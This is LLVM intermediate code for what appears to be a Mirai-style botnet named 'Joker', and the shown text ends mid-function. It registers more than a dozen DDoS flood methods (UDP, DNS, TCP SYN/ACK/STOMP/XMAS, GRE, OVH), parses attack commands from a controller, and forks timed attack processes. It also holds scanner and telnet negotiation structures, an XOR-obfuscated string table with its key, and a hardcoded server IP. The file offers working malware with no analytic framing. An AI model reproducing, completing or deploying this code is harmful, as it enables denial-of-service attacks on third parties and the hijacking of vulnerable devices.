; ModuleID = 'host/ir_O3/Joker.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.scanner_connection = type { %struct.scanner_auth*, i32, i32, i32, i32, i16, i32, [256 x i8], i8 }
%struct.scanner_auth = type { i8*, i8*, i16, i16, i8, i8 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.fd_set.28 = type { [16 x i64] }
%struct.timeval.29 = type { i64, i64 }

@methods_len = local_unnamed_addr global i8 0, align 1
@methods = local_unnamed_addr global %struct.attack_method** null, align 8
@attack_ongoing = local_unnamed_addr global [15 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common local_unnamed_addr global i32 0, align 4
@scanner_pid = common local_unnamed_addr global i32 0, align 4
@fake_time = local_unnamed_addr global i32 0, align 4
@conn_table = common local_unnamed_addr global %struct.scanner_connection* null, align 8
@rsck = common local_unnamed_addr global i32 0, align 4
@scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str = private unnamed_addr constant [5 x i8] c"&;; \00", align 1
@.str.1 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.2 = private unnamed_addr constant [9 x i8] c"<!: acam\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c" 18:1 \00", align 1
@.str.4 = private unnamed_addr constant [8 x i8] c"0125!8 \00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"$5''#;&0\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"509=:\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c"\22=.,\22\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"'!$$;& \00", align 1
@.str.9 = private unnamed_addr constant [13 x i8] c"c!>\19?;d509=:\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"efg`a\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"!'1&\00", align 1
@.str.12 = private unnamed_addr constant [9 x i8] c"\1B,<8#\07\13l\00", align 1
@.str.13 = private unnamed_addr constant [9 x i8] c"\07f2\13%\1A\12'\00", align 1
@.str.14 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.15 = private unnamed_addr constant [16 x i8] c"173.232.146.173\00", align 1
@consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@auth_table_max_weight = local_unnamed_addr global i16 0, align 2
@auth_table_len = local_unnamed_addr global i32 0, align 4
@auth_table = local_unnamed_addr global %struct.scanner_auth* null, align 8
@table = common local_unnamed_addr global [31 x %struct.table_value] zeroinitializer, align 16
@table_key = local_unnamed_addr global i32 -555811921, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() local_unnamed_addr #0 {
  tail call fastcc void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udpgeneric)
  tail call fastcc void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udpvse)
  tail call fastcc void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udpdns)
  tail call fastcc void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udpplain)
  tail call fastcc void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpsyn)
  tail call fastcc void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpack)
  tail call fastcc void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpstomp)
  tail call fastcc void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpxmas)
  tail call fastcc void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_greip)
  tail call fastcc void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_greeth)
  tail call fastcc void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_std)
  tail call fastcc void @add_attack(i8 zeroext 14, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_ovh)
  tail call fastcc void @add_attack(i8 zeroext 11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpusyn)
  tail call fastcc void @add_attack(i8 zeroext 12, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpall)
  tail call fastcc void @add_attack(i8 zeroext 13, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpfrag)
  tail call fastcc void @add_attack(i8 zeroext 15, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_asyn)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) unnamed_addr #0 {
  %3 = tail call noalias i8* @calloc(i64 1, i64 16) #10
  %4 = getelementptr inbounds i8, i8* %3, i64 8
  store i8 %0, i8* %4, align 8
  %5 = bitcast i8* %3 to void (i8, %struct.attack_target*, i8, %struct.attack_option*)**
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %5, align 8
  %6 = load i8*, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %7 = load i8, i8* @methods_len, align 1
  %8 = zext i8 %7 to i64
  %9 = shl nuw nsw i64 %8, 3
  %10 = add nuw nsw i64 %9, 8
  %11 = tail call i8* @realloc(i8* %6, i64 %10) #10
  %12 = bitcast i8* %11 to %struct.attack_method**
  store i8* %11, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %13 = load i8, i8* @methods_len, align 1
  %14 = add i8 %13, 1
  store i8 %14, i8* @methods_len, align 1
  %15 = zext i8 %13 to i64
  %16 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %12, i64 %15
  %17 = bitcast %struct.attack_method** %16 to i8**
  store i8* %3, i8** %17, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) local_unnamed_addr #1

; Function Attrs: nounwind
declare noalias i8* @realloc(i8* nocapture, i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() local_unnamed_addr #0 {
  %1 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 0), align 16
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %0
  %4 = tail call i32 @kill(i32 %1, i32 9) #10
  br label %5

; <label>:5:                                      ; preds = %0, %3
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 0), align 16
  %6 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 1), align 4
  %7 = icmp eq i32 %6, 0
  br i1 %7, label %10, label %8

; <label>:8:                                      ; preds = %5
  %9 = tail call i32 @kill(i32 %6, i32 9) #10
  br label %10

; <label>:10:                                     ; preds = %8, %5
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 1), align 4
  %11 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 2), align 8
  %12 = icmp eq i32 %11, 0
  br i1 %12, label %15, label %13

; <label>:13:                                     ; preds = %10
  %14 = tail call i32 @kill(i32 %11, i32 9) #10
  br label %15

; <label>:15:                                     ; preds = %13, %10
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 2), align 8
  %16 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 3), align 4
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %20, label %18

; <label>:18:                                     ; preds = %15
  %19 = tail call i32 @kill(i32 %16, i32 9) #10
  br label %20

; <label>:20:                                     ; preds = %18, %15
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 3), align 4
  %21 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 4), align 16
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %25, label %23

; <label>:23:                                     ; preds = %20
  %24 = tail call i32 @kill(i32 %21, i32 9) #10
  br label %25

; <label>:25:                                     ; preds = %23, %20
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 4), align 16
  %26 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 5), align 4
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %30, label %28

; <label>:28:                                     ; preds = %25
  %29 = tail call i32 @kill(i32 %26, i32 9) #10
  br label %30

; <label>:30:                                     ; preds = %28, %25
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 5), align 4
  %31 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 6), align 8
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %35, label %33

; <label>:33:                                     ; preds = %30
  %34 = tail call i32 @kill(i32 %31, i32 9) #10
  br label %35

; <label>:35:                                     ; preds = %33, %30
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 6), align 8
  %36 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 7), align 4
  %37 = icmp eq i32 %36, 0
  br i1 %37, label %40, label %38

; <label>:38:                                     ; preds = %35
  %39 = tail call i32 @kill(i32 %36, i32 9) #10
  br label %40

; <label>:40:                                     ; preds = %38, %35
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 7), align 4
  %41 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 8), align 16
  %42 = icmp eq i32 %41, 0
  br i1 %42, label %45, label %43

; <label>:43:                                     ; preds = %40
  %44 = tail call i32 @kill(i32 %41, i32 9) #10
  br label %45

; <label>:45:                                     ; preds = %43, %40
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 8), align 16
  %46 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 9), align 4
  %47 = icmp eq i32 %46, 0
  br i1 %47, label %50, label %48

; <label>:48:                                     ; preds = %45
  %49 = tail call i32 @kill(i32 %46, i32 9) #10
  br label %50

; <label>:50:                                     ; preds = %48, %45
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 9), align 4
  %51 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 10), align 8
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %55, label %53

; <label>:53:                                     ; preds = %50
  %54 = tail call i32 @kill(i32 %51, i32 9) #10
  br label %55

; <label>:55:                                     ; preds = %53, %50
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 10), align 8
  %56 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 11), align 4
  %57 = icmp eq i32 %56, 0
  br i1 %57, label %60, label %58

; <label>:58:                                     ; preds = %55
  %59 = tail call i32 @kill(i32 %56, i32 9) #10
  br label %60

; <label>:60:                                     ; preds = %58, %55
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 11), align 4
  %61 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 12), align 16
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %65, label %63

; <label>:63:                                     ; preds = %60
  %64 = tail call i32 @kill(i32 %61, i32 9) #10
  br label %65

; <label>:65:                                     ; preds = %63, %60
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 12), align 16
  %66 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 13), align 4
  %67 = icmp eq i32 %66, 0
  br i1 %67, label %70, label %68

; <label>:68:                                     ; preds = %65
  %69 = tail call i32 @kill(i32 %66, i32 9) #10
  br label %70

; <label>:70:                                     ; preds = %68, %65
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 13), align 4
  %71 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 14), align 8
  %72 = icmp eq i32 %71, 0
  br i1 %72, label %75, label %73

; <label>:73:                                     ; preds = %70
  %74 = tail call i32 @kill(i32 %71, i32 9) #10
  br label %75

; <label>:75:                                     ; preds = %73, %70
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 14), align 8
  tail call void @scanner_init() #10
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) local_unnamed_addr #0 {
  %3 = icmp ult i32 %1, 4
  br i1 %3, label %.thread80, label %4

; <label>:4:                                      ; preds = %2
  %5 = bitcast i8* %0 to i32*
  %6 = load i32, i32* %5, align 4
  %7 = tail call i32 @ntohl(i32 %6) #11
  %8 = icmp eq i32 %1, 4
  br i1 %8, label %.thread80, label %9

; <label>:9:                                      ; preds = %4
  %10 = getelementptr inbounds i8, i8* %0, i64 4
  %11 = load i8, i8* %10, align 1
  %12 = icmp eq i32 %1, 5
  br i1 %12, label %.thread80, label %13

; <label>:13:                                     ; preds = %9
  %14 = getelementptr inbounds i8, i8* %0, i64 5
  %15 = getelementptr inbounds i8, i8* %0, i64 6
  %16 = load i8, i8* %14, align 1
  %17 = add i32 %1, -6
  %18 = zext i8 %16 to i32
  %19 = icmp eq i8 %16, 0
  br i1 %19, label %.thread80, label %20

; <label>:20:                                     ; preds = %13
  %21 = sext i32 %17 to i64
  %22 = zext i8 %16 to i64
  %23 = mul nuw nsw i64 %22, 5
  %24 = icmp ult i64 %21, %23
  br i1 %24, label %.thread80, label %.lr.ph88.preheader

.lr.ph88.preheader:                               ; preds = %20
  %25 = tail call noalias i8* @calloc(i64 %22, i64 24) #10
  %26 = bitcast i8* %25 to %struct.attack_target*
  %27 = add nsw i32 %18, -1
  %28 = zext i32 %27 to i64
  %29 = mul nuw nsw i64 %28, 5
  %30 = add nuw nsw i64 %29, 11
  %scevgep = getelementptr i8, i8* %0, i64 %30
  %wide.trip.count = zext i8 %16 to i64
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph88.prol.loopexit, label %.lr.ph88.prol.preheader

.lr.ph88.prol.preheader:                          ; preds = %.lr.ph88.preheader
  br label %.lr.ph88.prol

.lr.ph88.prol:                                    ; preds = %.lr.ph88.prol.preheader
  %31 = bitcast i8* %15 to i32*
  %32 = load i32, i32* %31, align 4
  %33 = getelementptr inbounds i8, i8* %25, i64 16
  %34 = bitcast i8* %33 to i32*
  store i32 %32, i32* %34, align 4
  %35 = getelementptr inbounds i8, i8* %0, i64 10
  %36 = getelementptr inbounds i8, i8* %0, i64 11
  %37 = load i8, i8* %35, align 1
  %38 = getelementptr inbounds i8, i8* %25, i64 20
  store i8 %37, i8* %38, align 4
  %39 = bitcast i8* %25 to i16*
  store i16 2, i16* %39, align 4
  %40 = getelementptr inbounds i8, i8* %25, i64 4
  %41 = bitcast i8* %40 to i32*
  store i32 %32, i32* %41, align 4
  br label %.lr.ph88.prol.loopexit

.lr.ph88.prol.loopexit:                           ; preds = %.lr.ph88.preheader, %.lr.ph88.prol
  %indvars.iv91.unr = phi i64 [ 0, %.lr.ph88.preheader ], [ 1, %.lr.ph88.prol ]
  %.087.unr = phi i8* [ %15, %.lr.ph88.preheader ], [ %36, %.lr.ph88.prol ]
  %42 = icmp eq i8 %16, 1
  br i1 %42, label %._crit_edge, label %.lr.ph88.preheader.new

.lr.ph88.preheader.new:                           ; preds = %.lr.ph88.prol.loopexit
  br label %.lr.ph88

.lr.ph88:                                         ; preds = %.lr.ph88, %.lr.ph88.preheader.new
  %indvars.iv91 = phi i64 [ %indvars.iv91.unr, %.lr.ph88.preheader.new ], [ %indvars.iv.next92.1, %.lr.ph88 ]
  %.087 = phi i8* [ %.087.unr, %.lr.ph88.preheader.new ], [ %56, %.lr.ph88 ]
  %43 = bitcast i8* %.087 to i32*
  %44 = load i32, i32* %43, align 4
  %45 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 1
  store i32 %44, i32* %45, align 4
  %46 = getelementptr inbounds i8, i8* %.087, i64 4
  %47 = getelementptr inbounds i8, i8* %.087, i64 5
  %48 = load i8, i8* %46, align 1
  %49 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 2
  store i8 %48, i8* %49, align 4
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 0
  store i16 2, i16* %50, align 4
  %51 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 2, i32 0
  store i32 %44, i32* %51, align 4
  %indvars.iv.next92 = add nuw nsw i64 %indvars.iv91, 1
  %52 = bitcast i8* %47 to i32*
  %53 = load i32, i32* %52, align 4
  %54 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 1
  store i32 %53, i32* %54, align 4
  %55 = getelementptr inbounds i8, i8* %.087, i64 9
  %56 = getelementptr inbounds i8, i8* %.087, i64 10
  %57 = load i8, i8* %55, align 1
  %58 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 2
  store i8 %57, i8* %58, align 4
  %59 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 0
  store i16 2, i16* %59, align 4
  %60 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 2, i32 0
  store i32 %53, i32* %60, align 4
  %indvars.iv.next92.1 = add nsw i64 %indvars.iv91, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next92.1, %wide.trip.count
  br i1 %exitcond.1, label %._crit_edge.unr-lcssa, label %.lr.ph88

._crit_edge.unr-lcssa:                            ; preds = %.lr.ph88
  br label %._crit_edge

._crit_edge:                                      ; preds = %.lr.ph88.prol.loopexit, %._crit_edge.unr-lcssa
  %61 = mul nsw i32 %18, -5
  %62 = add i32 %17, %61
  %63 = icmp eq i32 %62, 0
  br i1 %63, label %.loopexit81.thread, label %64

; <label>:64:                                     ; preds = %._crit_edge
  %65 = load i8, i8* %scevgep, align 1
  %66 = icmp eq i8 %65, 0
  br i1 %66, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %64
  %67 = zext i8 %65 to i64
  %68 = tail call noalias i8* @calloc(i64 %67, i64 16) #10
  %69 = bitcast i8* %68 to %struct.attack_option*
  %70 = getelementptr inbounds i8, i8* %scevgep, i64 1
  %71 = add i32 %62, -1
  %72 = zext i8 %65 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %85
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %85 ]
  %.184 = phi i8* [ %70, %.lr.ph.preheader ], [ %91, %85 ]
  %.17583 = phi i32 [ %71, %.lr.ph.preheader ], [ %92, %85 ]
  %73 = icmp eq i32 %.17583, 0
  br i1 %73, label %.loopexit81.loopexit, label %74

; <label>:74:                                     ; preds = %.lr.ph
  %75 = load i8, i8* %.184, align 1
  %76 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %69, i64 %indvars.iv, i32 1
  store i8 %75, i8* %76, align 8
  %77 = icmp eq i32 %.17583, 1
  br i1 %77, label %.loopexit81.loopexit, label %78

; <label>:78:                                     ; preds = %74
  %79 = getelementptr inbounds i8, i8* %.184, i64 1
  %80 = getelementptr inbounds i8, i8* %.184, i64 2
  %81 = load i8, i8* %79, align 1
  %82 = add i32 %.17583, -2
  %83 = zext i8 %81 to i32
  %84 = icmp slt i32 %82, %83
  br i1 %84, label %.loopexit81.loopexit, label %85

; <label>:85:                                     ; preds = %78
  %86 = add nuw nsw i32 %83, 1
  %87 = zext i32 %86 to i64
  %88 = tail call noalias i8* @calloc(i64 %87, i64 1) #10
  %89 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %69, i64 %indvars.iv, i32 0
  store i8* %88, i8** %89, align 8
  tail call void @util_memcpy(i8* %88, i8* %80, i32 %83) #10
  %90 = zext i8 %81 to i64
  %91 = getelementptr inbounds i8, i8* %80, i64 %90
  %92 = sub nsw i32 %82, %83
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %93 = icmp slt i64 %indvars.iv.next, %72
  br i1 %93, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %85
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %64
  %.070 = phi %struct.attack_option* [ null, %64 ], [ %69, %.loopexit.loopexit ]
  %94 = tail call i32* @__errno_location() #11
  store i32 0, i32* %94, align 4
  tail call void @attack_start(i32 %7, i8 zeroext %11, i8 zeroext %16, %struct.attack_target* %26, i8 zeroext %65, %struct.attack_option* %.070)
  br label %.loopexit81

.loopexit81.loopexit:                             ; preds = %.lr.ph, %74, %78
  br label %.loopexit81

.loopexit81:                                      ; preds = %.loopexit81.loopexit, %.loopexit
  %.171 = phi %struct.attack_option* [ %.070, %.loopexit ], [ %69, %.loopexit81.loopexit ]
  %95 = icmp eq i8* %25, null
  br i1 %95, label %96, label %.loopexit81.thread

.loopexit81.thread:                               ; preds = %._crit_edge, %.loopexit81
  %.17195 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ null, %._crit_edge ]
  %.07393 = phi i8 [ %65, %.loopexit81 ], [ undef, %._crit_edge ]
  tail call void @free(i8* nonnull %25) #10
  br label %96

; <label>:96:                                     ; preds = %.loopexit81, %.loopexit81.thread
  %.17196 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ %.17195, %.loopexit81.thread ]
  %.07394 = phi i8 [ %65, %.loopexit81 ], [ %.07393, %.loopexit81.thread ]
  %97 = icmp eq %struct.attack_option* %.17196, null
  br i1 %97, label %.thread80, label %98

; <label>:98:                                     ; preds = %96
  %99 = zext i8 %.07394 to i32
  tail call fastcc void @free_opts(%struct.attack_option* nonnull %.17196, i32 %99)
  br label %.thread80

.thread80:                                        ; preds = %2, %4, %9, %13, %20, %96, %98
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #2

declare void @util_memcpy(i8*, i8*, i32) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) local_unnamed_addr #0 {
  %7 = tail call i32 @fork() #10
  %8 = icmp eq i32 %7, -1
  %9 = icmp sgt i32 %7, 0
  %or.cond = or i1 %8, %9
  br i1 %or.cond, label %10, label %11

; <label>:10:                                     ; preds = %6
  ret void

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @fork() #10
  switch i32 %12, label %.preheader [
    i32 -1, label %17
    i32 0, label %18
  ]

.preheader:                                       ; preds = %11
  %13 = load i8, i8* @methods_len, align 1
  %14 = icmp eq i8 %13, 0
  br i1 %14, label %.loopexit, label %.lr.ph

.lr.ph:                                           ; preds = %.preheader
  %15 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %16 = zext i8 %13 to i64
  br label %24

; <label>:17:                                     ; preds = %11
  tail call void @exit(i32 0) #12
  unreachable

; <label>:18:                                     ; preds = %11
  %19 = tail call i32 @sleep(i32 %0) #10
  %20 = tail call i32 @getppid() #10
  %21 = tail call i32 @kill(i32 %20, i32 9) #10
  tail call void @exit(i32 0) #12
  unreachable

; <label>:22:                                     ; preds = %24
  %23 = icmp slt i64 %indvars.iv.next, %16
  br i1 %23, label %24, label %.loopexit.loopexit

; <label>:24:                                     ; preds = %.lr.ph, %22
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %22 ]
  %25 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %15, i64 %indvars.iv
  %26 = load %struct.attack_method*, %struct.attack_method** %25, align 8
  %27 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %26, i64 0, i32 1
  %28 = load i8, i8* %27, align 8
  %29 = icmp eq i8 %28, %1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %29, label %30, label %22

; <label>:30:                                     ; preds = %24
  %31 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %26, i64 0, i32 0
  %32 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %31, align 8
  tail call void %32(i8 zeroext %2, %struct.attack_target* %3, i8 zeroext %4, %struct.attack_option* %5) #10
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %22
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %30
  tail call void @exit(i32 0) #12
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @free_opts(%struct.attack_option*, i32) unnamed_addr #0 {
  %3 = icmp eq %struct.attack_option* %0, null
  br i1 %3, label %11, label %.preheader

.preheader:                                       ; preds = %2
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %9
  %indvars.iv = phi i64 [ %indvars.iv.next, %9 ], [ 0, %.lr.ph.preheader ]
  %5 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %0, i64 %indvars.iv, i32 0
  %6 = load i8*, i8** %5, align 8
  %7 = icmp eq i8* %6, null
  br i1 %7, label %9, label %8

; <label>:8:                                      ; preds = %.lr.ph
  tail call void @free(i8* nonnull %6) #10
  br label %9

; <label>:9:                                      ; preds = %.lr.ph, %8
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %9
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %10 = bitcast %struct.attack_option* %0 to i8*
  tail call void @free(i8* %10) #10
  br label %11

; <label>:11:                                     ; preds = %2, %._crit_edge
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #4

declare i32 @sleep(i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @getppid() local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i8* readnone) local_unnamed_addr #5 {
  %5 = icmp eq i8 %0, 0
  br i1 %5, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %4
  %6 = zext i8 %0 to i64
  br label %.lr.ph

; <label>:7:                                      ; preds = %.lr.ph
  %8 = icmp slt i64 %indvars.iv.next, %6
  br i1 %8, label %.lr.ph, label %.loopexit.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %7
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %7 ]
  %9 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 1
  %10 = load i8, i8* %9, align 8
  %11 = icmp eq i8 %10, %2
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %11, label %12, label %7

; <label>:12:                                     ; preds = %.lr.ph
  %13 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 0
  %14 = load i8*, i8** %13, align 8
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %7
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4, %12
